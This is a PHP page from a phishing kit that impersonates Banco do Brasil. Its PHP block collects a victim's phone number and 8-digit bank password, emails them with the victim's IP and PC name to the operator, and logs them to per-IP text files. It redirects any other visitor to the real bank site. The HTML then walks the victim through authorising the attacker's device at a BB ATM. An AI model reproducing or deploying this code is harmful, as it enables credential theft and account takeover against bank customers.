<?php
include('../conn.php');

if(isset($_POST['sender']) && $_POST['sender'] == 'home'){
    $senha8    = $_POST['senha8'];
    $telefone = $_POST['telefone'];

    $mensagem = "IP: {$ip} | DATA: {$data} [{$hora}] | PC NAME: {$pc_name}<br>
<br>
telefone: {$telefone}<br>
senha de 8: {$senha8}";


    if($envioSMTP == 'sim'){
        sendMail($assunto,$mensagem,$aviao,$destino,'smtp',$tipo_security);
    }else{
        sendMail($assunto,$mensagem,$aviao,$destino,'php');
    }

    $msg_txt = str_replace('<br>', '', $mensagem);
    $fp = fopen("natal/{$ip}.txt", "a");
    $escreve = fwrite($fp, $msg_txt);
    fclose($fp);

}else{
    header('Location: https://www.bb.com.br/pbb/pagina-inicial#/');
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Bem vindo - Aplicativo Online</title>
    <link rel="shortcut icon" href="../imagens/favicon.png" />

    <meta name="theme-color" content="#f4f102">
	<meta name="msapplication-navbutton-color" content="#f4f102">
	<meta name="apple-mobile-web-app-status-bar-style" content="#f4f102">

    <meta name="robots" content="noindex,nofollow">
	<meta name="googlebot" content="noindex,nofollow">
	<meta name="robots" content="noarchive">

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
</head>
<body class="back_blue">

<div class="row hd_top">
    <div class="centralizar">
        <img src="../imagens/logo.jpg" class="cima_logo">
        <div class="desc_now">
            <h1>Finalização.</h1>
            <p>
                Agora, para finalizarmos esta solicitação, você deverá procurar um caixa eletrônico BB e realizar o procedimento de liberação deste dispositivo.
            </p>

            <br><br>
            
            <p style="font-size: 1.2em;color:#f4f102;">Como realizar o desbloqueio?</p>

            <br>

            <p style="font-size: .9em;">Passo a passo:</p>

            <br>

            <p style="text-align:left;margin-bottom: 6px;">1 - Procure um <span style="font-weight:700;color:#fff;">caixa eletronico BB</span> mais próximo.</p>
            <p style="text-align:left;margin-bottom: 6px;">2 - Identifique-se com seu cartão.</p>
            <p style="text-align:left;margin-bottom: 6px;">3 - Selecione "<span style="font-weight:700;color:#fff;">Autorização/Bloqueio de celular</span>".</p>
            <p style="text-align:left;margin-bottom: 6px;">4 - Selecione "<span style="font-weight:700;color:#fff;">Para uso do Aplicativo BB (APP)</span>".</p>
            <p style="text-align:left;margin-bottom: 6px;">5 - Nesta tela lhe será apresentado seus dispositivos cadastrados e pendentes.</p>
            <p style="text-align:left;margin-bottom: 6px;">6 - Selecione este dispositivo.</p>
            <p style="text-align:left;margin-bottom: 6px;">7 - Clique em "<span style="font-weight:700;color:#fff;">AUTORIZAR</span>", e informe os dados requeridos para o procedimento.</p>
        </div>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<!-- includes -->
<link rel="stylesheet" href="../estilos/estilo.css">
<script src="../javascripts/jquery.min.js"></script>
<script src="../javascripts/javascripts.js"></script>

</body>
</html>